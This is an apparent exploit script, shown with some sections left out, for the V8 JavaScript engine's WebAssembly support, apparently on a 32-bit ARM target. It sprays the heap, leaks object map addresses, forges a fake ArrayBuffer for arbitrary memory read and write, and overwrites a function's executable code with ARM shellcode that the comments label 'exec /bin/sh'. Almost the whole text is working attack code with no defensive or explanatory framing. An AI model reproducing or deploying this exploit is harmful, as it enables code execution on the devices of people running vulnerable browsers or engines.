...
// d8.file.execute('/data/local/tmp/d8_test/crash-20240204/wasm-module-builder.js');
...
kExprI32Const, 0x9d, 0xe2, 0xd2, 0x95, 0x7f,  // i32.const
...
x = builder.toBuffer()
// victim = new Array(0x1000);
// victim[0] = 1.1;
y = new ArrayBuffer(0x78000000);
const uint32 = new Uint32Array(y);


ab = new ArrayBuffer(0x100);
const uint32_trans = new Uint32Array(ab);
const f64_trans = new Float64Array(ab);
function f2u(x){
  f64_trans[0] = x;
  return [uint32_trans[0],uint32_trans[1]]
}
...
spary_address = 0x7ff00000;
guess_address =  0x5915d000;//0x592cd000;//0xe1650000;
const evil_f = () => {
  return [
...
console.log("[+] occupy memory with JSArrayBuffer");

keeper = []
a2 = [1.1,1.2];
victim_ab = new ArrayBuffer(0x1000);

for(var i = 0 ; i<0x1400000;i++){
  a1 = [0xdead,a2,evil_f,victim_ab];
  keeper.push(a1);
}
console.log("[+] JSObect spray");
// %DebugPrint(keeper[0]);
// %DebugPrint(keeper[0x800000-1]);

console.log("[+] finish JSObect spray");
readline();
// %DebugPrint(keeper[0x200000-1]);
  // %DebugPrint("pppppppppppppppppp4nda");

// readline();
const v4 = new WebAssembly.Module(x);
function foo(a,b,c,d,e,f,g){
  console.log("[->] from wasm call into js");
  // e.__proto__ = Array[0].__proto__;
    ...
    if(offset<0){
      offset = 0x100000000+guess_address - spary_address - 0xc;
    ...
    if(double_arr_addr != 0){
      // next step leak map and property
      if(double_arr_addr < spary_address){
        offset= 0x100000000 + double_arr_addr - spary_address - 0xc - 1;
      }else{
        offset= double_arr_addr - spary_address - 0xc -1;
      }
      double_map_str = e.slice(offset,offset+4);
        for(j = 0 ; j <4 ;j++){
          double_map_addr += double_map_str.charCodeAt(j) << (8*j);
          // console.log("[leak] double_map: "+double_map_str.charCodeAt(j).toString(16))
        }
      console.log("[leak] double_map: "+double_map_addr.toString(16));
      offset += 4;
      element_map_str = e.slice(offset,offset+4);
        for(j = 0 ; j <4 ;j++){
          element_map_addr += element_map_str.charCodeAt(j) << (8*j);
          // console.log("[leak] element"+element_map_str.charCodeAt(j).toString(16))
        }
      console.log("[leak] element: "+element_map_addr.toString(16));
      offset += 4;
      property_map_str = e.slice(offset,offset+4);
        for(j = 0 ; j <4 ;j++){
          property_map_addr += property_map_str.charCodeAt(j) << (8*j);
          // console.log(property_map_str.charCodeAt(j).toString(16))
        }
      console.log("[leak] property: "+property_map_addr.toString(16));   
      ...
      if(double_map_str!=0){
        ...
        vv3 = e[3];
        vv4 = e[4];
        fake_ab_arr = [f2u(vv0)[0],f2u(vv0)[1],f2u(vv1)[0],f2u(vv1)[1],f2u(vv2)[0],f2u(vv2)[1],victim_ab_addr-1,f2u(vv3)[1],f2u(vv4)[0],f2u(vv4)[1],]
        for(var j = 0 ; j < 0x20000 ; j++){
          idx = (j*0x1000)/4
          for(var k = 0 ; k <10;k++){
            uint32[idx + k]  = fake_ab_arr[k]
          }
        }        
          console.log("[+] fake obj => JSArrayBuffer");
          // %DebugPrint(e);
          // fake_dv = new DataView(e);
          fake_u32a = new Uint32Array(e);
          fake_u32a[6] = spary_address;
          // fake_dv.setUint32(0xc,spary_address,true);
          // %DebugPrint(fake_u32a);
          // %DebugPrint(victim_ab);
          victim_u32a = new Uint32Array(victim_ab);
          victim_u32a[6] = evilf_addr + 0xc -1;
          fake_u32a = new Uint32Array(e);
          code_addr = fake_u32a[0];
          console.log("[leak] code_addr:"+code_addr.toString(16));
          victim_u32a = new Uint32Array(victim_ab);
          victim_u32a[6] = code_addr-1+0x14;
          fake_u32a = new Uint32Array(e);
          wrx_code = fake_u32a[0];
          console.log("[leak]wrx_code:"+wrx_code.toString(16));
          victim_u32a = new Uint32Array(victim_ab);
          victim_u32a[6] = wrx_code;
          fake_u8a = new Uint8Array(e);
          fake_u8a.set([104 , 112 , 0 , 227 , 65 , 113 , 68 , 227 , 4 , 112 , 45 , 229 , 47 , 127 , 2 , 227 , 47 , 115 , 71 , 227 , 4 , 112 , 45 , 229 , 47 , 114 , 6 , 227 , 105 , 126 , 70 , 227 , 4 , 112 , 45 , 229 , 13 , 0 , 160 , 225 , 115 , 120 , 6 , 227 , 4 , 112 , 45 , 229 , 12 , 192 , 44 , 224 , 4 , 192 , 45 , 229 , 4 , 16 , 160 , 227 , 13 , 16 , 129 , 224 , 1 , 192 , 160 , 225 , 4 , 192 , 45 , 229 , 13 , 16 , 160 , 225 , 2 , 32 , 34 , 224 , 11 , 112 , 160 , 227 , 0 , 0 , 0 , 239 ]);
          //[0x11,0x1,0x1,0xe3,0x11,0x11,0x1,0xe3,0x0,0x18,0xa0,0xe1,0x0,0x10,0x81,0xe0,0x22,0x2,0x2,0xe3,0x22,0x22,0x2,0xe3,0x0,0x28,0xa0,0xe1,0x0,0x20,0x82,0xe0,0x33,0x3,0x3,0xe3,0x33,0x33,0x3,0xe3,0x0,0x38,0xa0,0xe1,0x0,0x30,0x83,0xe0,0x44,0x4,0x4,0xe3,0x44,0x44,0x4,0xe3,0x0,0x48,0xa0,0xe1,0x0,0x40,0x84,0xe0,0x55,0x5,0x5,0xe3,0x55,0x55,0x5,0xe3,0x0,0x58,0xa0,0xe1,0x0,0x50,0x85,0xe0,0x66,0x6,0x6,0xe3,0x66,0x66,0x6,0xe3,0x0,0x68,0xa0,0xe1,0x0,0x60,0x86,0xe0,0x77,0x7,0x7,0xe3,0x77,0x77,0x7,0xe3,0x0,0x78,0xa0,0xe1,0x0,0x70,0x87,0xe0,0x41,0x1,0x4,0xe3,0x41,0x81,0x4,0xe3,0x0,0x88,0xa0,0xe1,0x0,0x80,0x88,0xe0,0x0,0x0,0xa0,0xe3,0x8,0xf0,0xa0,0xe1,0xef,0xbe,0xad,0xde]
          // [104 , 112 , 0 , 227 , 65 , 113 , 68 , 227 , 4 , 112 , 45 , 229 , 47 , 127 , 2 , 227 , 47 , 115 , 71 , 227 , 4 , 112 , 45 , 229 , 47 , 114 , 6 , 227 , 105 , 126 , 70 , 227 , 4 , 112 , 45 , 229 , 13 , 0 , 160 , 225 , 115 , 120 , 6 , 227 , 4 , 112 , 45 , 229 , 12 , 192 , 44 , 224 , 4 , 192 , 45 , 229 , 4 , 16 , 160 , 227 , 13 , 16 , 129 , 224 , 1 , 192 , 160 , 225 , 4 , 192 , 45 , 229 , 13 , 16 , 160 , 225 , 2 , 32 , 34 , 224 , 11 , 112 , 160 , 227 , 0 , 0 , 0 , 239 ]// exec /bin/sh
          console.log("[+] hijack the evil_f code with shellcode")
          // readline();
          // %DebugPrint(evil_f);
          // readline();
          evil_f();
      ...
      console.log("bad guess:"+guess_address.toString(16));
      console.log("try again or find another stable v8 heap address");
      readline();
    }
    ...
    // bad_u32array = new Uint32Array(e);
    // %DebugPrint(bad_u32array);
